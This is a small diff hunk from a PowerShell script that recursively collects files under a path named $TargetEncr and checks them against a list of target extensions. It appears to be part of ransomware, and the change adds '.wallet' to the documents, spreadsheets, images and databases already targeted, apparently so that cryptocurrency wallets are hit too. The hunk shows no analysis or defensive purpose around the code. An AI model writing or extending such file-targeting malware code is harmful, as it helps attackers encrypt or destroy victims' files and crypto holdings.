@@ -132,7 +132,7 @@ $files = Get-ChildItem -Path $TargetEncr -Recurse -ErrorAction SilentlyContinue 
 
 $havemercy = 2000;
 
-$extensions = @('doc', 'docm', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'txt', 'jpg', 'jpeg', '.sql', '.db');
+$extensions = @('doc', 'docm', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'txt', 'jpg', 'jpeg', '.sql', '.db', '.wallet');
 $counter = @{};
 foreach ($extension in $extensions)
 {
